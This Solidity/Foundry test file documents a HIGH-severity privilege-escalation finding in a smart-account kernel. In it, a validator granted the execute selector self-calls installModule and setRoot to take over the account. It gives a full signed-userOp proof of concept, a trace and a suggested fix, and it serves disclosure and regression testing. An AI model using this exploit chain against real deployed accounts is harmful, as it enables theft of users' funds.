// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {IEntryPoint} from "account-abstraction/interfaces/IEntryPoint.sol";
import {PackedUserOperation} from "account-abstraction/interfaces/PackedUserOperation.sol";
import {Kernel} from "src/Kernel.sol";
import {KernelFactory} from "src/KernelFactory.sol";
import {KernelUUPS} from "src/KernelUUPS.sol";
import {KernelImmutableECDSA} from "src/KernelImmutableECDSA.sol";
import {Install} from "src/types/Structs.sol";
import {ValidationId} from "src/types/Types.sol";
import {EntryPointLib} from "../utils/EntryPointLib.sol";
import {ECDSAValidator} from "../mock/ECDSAValidator.sol";

/// @title  ExecuteSelectorGrantTakeover — failing test for the
///         "grant `execute` selector → root takeover" finding (HIGH).
///
/// @notice STATUS: this test is EXPECTED TO FAIL on v0.4.0. After the team
///         restricts cross-call execution from non-root validators (e.g. by
///         rejecting `execute(target = address(this), …)` from non-root vIds,
///         or by introducing a separate selector grant for self-targeted
///         execution), the assertion that `kernel.root()` is unchanged will
///         hold.
///
/// @dev    Bug: `Kernel.execute(mode, executionData)` (`src/Kernel.sol:207-210`)
///         only checks `_onlyEntryPointOrSelf()`. The userOp validation gating
///         in `_processUserOp` (`src/Kernel.sol:160-174`) only checks the OUTER
///         selector — when a non-root validator V is granted `Kernel.execute.selector`,
///         the inner dispatch parameters (target/value/data) are NOT bound to
///         any further check. V can submit a userOp whose calldata is
///         `execute(SINGLE, target=address(this), value=0, data=setRoot(newVid))`.
///
///         Trace:
///           - userOp.callData = `execute.selector || abi.encode(mode, executionData)`.
///           - Validation: `_allowedSelector(V, execute.selector) == true` (granted)
///             AND `vInfo[V].hook == HOOK_MODULE_INSTALLED_NO_HOOK` ⇒ no-op gating
///             branch is taken. V's signer signs userOpHash; validation passes.
///           - EntryPoint dispatches `kernel.execute(mode, executionData)` with
///             `msg.sender == EP` ⇒ `_onlyEntryPointOrSelf()` passes.
///           - `_executeCall` does `address(this).call(setRoot(newVid))`. The
///             inner call's `msg.sender == kernel == address(this)` ⇒ the inner
///             `setRoot`'s `_onlyEntryPointOrSelf()` ALSO passes.
///           - Root flips to `newVid`. Owner is locked out.
///
/// @dev    Severity: HIGH (Immunefi: privilege escalation / governance takeover
///         with conditions). The owner GRANTED the `execute` selector to V —
///         their mental model is "V can move my assets via execute(target, ...)".
///         The contract reality is "execute is general-purpose dispatch including
///         self-call to privileged functions", which silently elevates V to
///         co-root. The same path also enables `installModule(...)` and any
///         `address(this)`-targeted privileged function.
///
/// @dev    Suggested fix: in `_executeCall` / `_executeBatchCall`, reject
///         `target == address(this)` UNLESS the validator is the current root
///         (`vId == $.root`). Alternatively, expose the inner-target check at
///         validation time so the selector grant model can express the
///         narrower "execute to non-self" intent.
contract ExecuteSelectorGrantTakeoverTest is Test {
    bytes4 constant EXECUTE_SELECTOR = Kernel.execute.selector;

    IEntryPoint ep;
    KernelFactory factory;
    ECDSAValidator rootValidator;
    ECDSAValidator sideValidator;
    Kernel kernel;

    address ownerBob;
    uint256 ownerBobKey;
    address sideAlice;
    uint256 sideAliceKey;
    address payable beneficiary;

    function setUp() external {
        ep = EntryPointLib.deploy();
        KernelUUPS uups = new KernelUUPS(ep);
        KernelImmutableECDSA immutableEcdsa = new KernelImmutableECDSA(ep);
        factory = new KernelFactory(uups, immutableEcdsa);

        (ownerBob, ownerBobKey) = makeAddrAndKey("OwnerBob");
        (sideAlice, sideAliceKey) = makeAddrAndKey("SideAlice");
        beneficiary = payable(makeAddr("Bene"));

        rootValidator = new ECDSAValidator();
        sideValidator = new ECDSAValidator();

        Install[] memory bootPkgs = new Install[](1);
        bootPkgs[0] = Install({
            moduleType: 1,
            module: address(rootValidator),
            moduleData: abi.encodePacked(ownerBob),
            internalData: hex""
        });
        kernel = factory.deploy(bootPkgs, 0);
        vm.deal(address(kernel), 10 ether);

        // Owner Bob installs Alice's side validator with the `execute` selector
        // explicitly granted. Bob's mental model: "Alice can move my assets via
        // execute(target, value, data) — but she has no privileges over the kernel
        // itself."
        // internalData = abi.encodePacked(hookAddress=NO_HOOK_sentinel(0x...01), executeSelector)
        bytes memory grantData = abi.encodePacked(address(0), EXECUTE_SELECTOR);
        vm.prank(address(ep));
        kernel.installModule(1, address(sideValidator), abi.encode(abi.encodePacked(sideAlice), grantData));
    }

    /// @notice Asserts that a non-root validator granted `execute.selector` CANNOT
    ///         escalate to setRoot via `execute(SINGLE, target=address(this), data=setRoot(newVid))`.
    ///         Currently FAILS on v0.4.0 because the kernel.execute self-call
    ///         path is unrestricted for non-root vIds.
    function test_side_validator_with_execute_selector_must_not_setRoot() external {
        ValidationId rootBefore = kernel.root();

        // newVid = a fresh validator that side-Alice controls (her own ECDSA validator
        // installed with sideAlice as signer).
        ECDSAValidator aliceOwnValidator = new ECDSAValidator();

        // Stage 1: install Alice's own validator (also via the side validator's
        // execute-selector grant — the side validator is the FIRST step of the
        // takeover chain).
        bytes memory installAliceValidator = abi.encodeWithSignature(
            "installModule(uint256,address,bytes)",
            uint256(1),
            address(aliceOwnValidator),
            abi.encode(abi.encodePacked(sideAlice), hex"")
        );

        _submitExecuteSelfCall(installAliceValidator);

        // Stage 2: setRoot to Alice's validator via the same self-call exploit.
        ValidationId aliceVid = ValidationId.wrap(bytes21(abi.encodePacked(bytes1(0x01), address(aliceOwnValidator))));
        bytes memory setRootCall = abi.encodeWithSignature("setRoot(bytes21)", ValidationId.unwrap(aliceVid));

        _submitExecuteSelfCall(setRootCall);

        // EXPECTED-AFTER-FIX: root must NOT have changed. The side validator
        // should not have governance-takeover authority just by virtue of
        // holding the `execute` selector grant.
        assertEq(
            ValidationId.unwrap(kernel.root()),
            ValidationId.unwrap(rootBefore),
            "non-root validator with execute-selector must not flip root"
        );
    }

    /// @dev Submits a userOp from the side validator that calls
    ///      `kernel.execute(SINGLE, target=address(this), value=0, data=innerCall)`.
    function _submitExecuteSelfCall(bytes memory innerCall) internal {
        bytes memory executionData = abi.encodePacked(address(kernel), uint256(0), innerCall);
        bytes memory callData = abi.encodeWithSelector(kernel.execute.selector, bytes32(0), executionData);

        PackedUserOperation memory op;
        op.sender = address(kernel);
        // nonce key encoding: vMode=0, vType=0x01 (VALIDATOR), vId=sideValidator address
        uint192 key =
            uint192(bytes24(abi.encodePacked(bytes1(0), bytes1(0x01), bytes20(address(sideValidator)), bytes2(0))));
        op.nonce = ep.getNonce(address(kernel), key);
        op.callData = callData;
        op.accountGasLimits = bytes32((uint256(2_000_000) << 128) | uint256(2_000_000));
        op.preVerificationGas = 100_000;
        op.gasFees = bytes32((uint256(1 gwei) << 128) | uint256(1 gwei));

        bytes32 opHash = ep.getUserOpHash(op);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sideAliceKey, opHash);
        op.signature = abi.encodePacked(r, s, v);

        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = op;

        vm.prank(beneficiary, beneficiary);
        ep.handleOps(ops, beneficiary);
    }
}
